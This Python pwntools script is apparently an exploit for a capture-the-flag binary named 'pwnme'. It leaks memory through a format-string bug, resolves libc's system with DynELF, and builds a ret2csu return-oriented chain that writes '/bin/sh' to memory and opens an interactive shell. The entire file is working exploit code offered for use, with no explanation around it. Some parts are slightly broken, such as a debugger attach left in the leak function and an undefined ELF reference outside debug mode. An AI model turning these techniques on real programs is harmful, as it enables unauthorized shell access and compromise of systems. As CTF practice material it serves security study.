# coding:utf-8
from pwn import *

dbg_flag = False
if dbg_flag:
    elf = ELF('./pwnme')
    context(log_level='debug')
    p = process('./pwnme')
else:
    p=process('./pwnme')

rwdata_addr = 0x602000
overwrite = 'A'*40
pop5ret_addr = 0x400eca
movcall_addr = 0x400eb0
vulnfunc_addr = 0x400CE9
poprdiret_addr = 0x400ed3

read_got = 0x601FC8
log.info('got.read: ' + hex(read_got))

def create_account():
    p.recvuntil('40):')
    p.sendline('mName')
    p.recvuntil('40):')
    p.sendline('mPaswd')

def leak(addr):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('lenth:20):')
    p.sendline('name')
    p.recvuntil('lenth:20):')
    payload = '%12$s' + 'AAAAAAA' + p64(addr)
    gdb.attach(proc.pidof(p)[0])
    p.send(payload)
    p.recvuntil('>')
    p.sendline('1')
    data = p.recvuntil('AAAAAAA')
    if(len(data) == 12):
        log.info('Null')
        return '\x00'
    else:
        log.info("%#x -- > %s" % (addr,(data[5:-7] or '').encode('hex')))
        return data[5:-7]

def gadget_call(func_addr, arg1=0, arg2=0, arg3=0, init_ret1=movcall_addr, init_ret2=vulnfunc_addr):
    payload = overwrite
    payload += p64(pop5ret_addr)
    payload += p64(0)   # rbx
    payload += p64(1)   # rbp
    payload += p64(func_addr)
    payload += p64(arg3) + p64(arg2) + p64(arg1)
    payload += p64(init_ret1)    # call 
    payload += '\x00'*(7*0x8)       # pop7
    payload += p64(init_ret2)   # 最后返回到有漏洞的地方下次再次利用
    return payload

def exp(system_address):
    p.recvuntil('>')
    # edit name and password
    p.sendline('2')
    p.recvuntil('lenth:20):')
    p.sendline('name')
    p.recvuntil('lenth:20):')
    payload = gadget_call(read_got, arg1=0, arg2=rwdata_addr, arg3=0x08, init_ret2=poprdiret_addr)
    payload += p64(rwdata_addr) + p64(system_address)
    payload += 'A'*(0x110-len(payload))
    p.send(payload)
    p.sendline('/bin/sh\x00')
    p.interactive()

create_account()
dyn = DynELF(leak, elf=ELF('./pwnme'))
system_addr = dyn.lookup('system', 'libc')
log.info("system addr:" + hex(system_addr))

exp(system_addr)


